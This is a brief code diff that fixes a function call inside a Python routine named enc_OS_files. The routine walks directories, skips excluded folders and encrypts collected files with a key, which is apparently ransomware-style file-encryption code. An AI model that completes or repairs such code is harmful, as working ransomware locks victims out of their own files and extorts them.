@@ -34,7 +34,7 @@ def enc_OS_files(ke):
                         k = os.path.join(dir_path, f)
                         for x in exclusion_dir:
                             if not x in dir_path.lower() and k not in files:
-                                enc(files,str(ke))
+                                enc_files(files,str(ke))
             else:
                 k = os.path.join(dir_path, f)
                 files.append(str(k))
